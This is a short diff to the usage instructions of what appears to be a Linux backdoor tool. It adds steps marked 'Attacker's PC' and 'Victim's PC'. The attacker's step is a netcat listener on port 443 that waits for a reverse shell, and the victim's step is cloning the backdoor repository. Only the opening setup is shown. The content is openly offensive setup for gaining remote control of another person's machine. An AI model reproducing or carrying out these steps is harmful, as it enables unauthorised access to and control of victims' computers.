@@ -2,6 +2,12 @@
 
 Usage : 
 
+  ~ Attacker's PC ~
+   
+   nc -lvnp 443
+   
+  ~ Victim's PC ~
+
   git clone https://github.com/KingstonCyberSec/linux_backdoor.git
   
   cd linux_backdoor
